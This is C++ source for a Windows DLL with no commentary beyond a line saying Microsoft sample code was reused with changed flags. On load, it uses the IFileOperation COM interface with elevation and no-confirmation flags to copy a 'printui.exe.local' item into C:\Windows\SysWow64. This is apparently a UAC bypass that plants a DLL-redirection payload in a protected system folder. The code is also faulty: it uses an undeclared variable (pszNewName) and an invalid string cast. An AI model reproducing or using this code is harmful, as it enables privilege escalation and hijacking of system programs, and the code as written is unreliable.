#include "stdafx.h"
#include <string>

// taken from  ms
// i simply changed the operation flags....
HRESULT
CopyItem(
	__in PCWSTR pszSrcItem,
	__in PCWSTR pszDest, PCWSTR pszNewName)
{
	//
	// Initialize COM as STA.
	//
	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
	if (SUCCEEDED(hr))
	{
		IFileOperation *pfo;

		//
		// Create the IFileOperation interface 
		//
		hr = CoCreateInstance(CLSID_FileOperation,
			NULL,
			CLSCTX_ALL,
			IID_PPV_ARGS(&pfo));
		if (SUCCEEDED(hr))
		{
			//
			// Set the operation flags. Turn off all UI from being shown to the
			// user during the operation. This includes error, confirmation,
			// and progress dialogs.
			//
			hr = pfo->SetOperationFlags( // changed....
				FOF_NOCONFIRMATION |
				FOFX_NOCOPYHOOKS |
				FOFX_REQUIREELEVATION);
			if (SUCCEEDED(hr))
			{
				//
				// Create an IShellItem from the supplied source path.
				//
				IShellItem *psiFrom = NULL;
				hr = SHCreateItemFromParsingName(pszSrcItem,
					NULL,
					IID_PPV_ARGS(&psiFrom));
				if (SUCCEEDED(hr))
				{
					IShellItem *psiTo = NULL;

					if (NULL != pszDest)
					{
						//
						// Create an IShellItem from the supplied 
						// destination path.
						//
						hr = SHCreateItemFromParsingName(pszDest,
							NULL,
							IID_PPV_ARGS(&psiTo));
					}

					if (SUCCEEDED(hr))
					{
						//
						// Add the operation
						//
						hr = pfo->CopyItem(psiFrom, psiTo, pszNewName, NULL);

						if (NULL != psiTo)
						{
							psiTo->Release();
						}
					}

					psiFrom->Release();
				}

				if (SUCCEEDED(hr))
				{
					//
					// Perform the operation to copy the file.
					//
					hr = pfo->PerformOperations();
				}
			}

			//
			// Release the IFileOperation interface.
			//
			pfo->Release();
		}

		CoUninitialize();
	}
	return hr;
}

BOOL 
APIENTRY
DllMain(
	HMODULE hModule,
	DWORD ul_reason_for_call,
	LPVOID lpReserved)
{
	PCWSTR pszDest = L"C:\\Windows\\SysWow64";
	PCWSTR dllName = L"printui.exe.local";
	wchar_t dllPath[1024];
	GetModuleFileName(hModule, dllPath, 1024);
	std::wstring pszSrcItem(dllPath);
	const size_t last = pszSrcItem.rfind('\\');
	if (std::wstring::npos != last)
	{
		pszSrcItem = pszSrcItem.substr(0, last + 1);
	}
	pszSrcItem += dllName;
	switch (ul_reason_for_call) {	
	case DLL_PROCESS_ATTACH:	
		CopyItem((PCWSTR)pszSrcItem, pszDest, pszNewName);
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

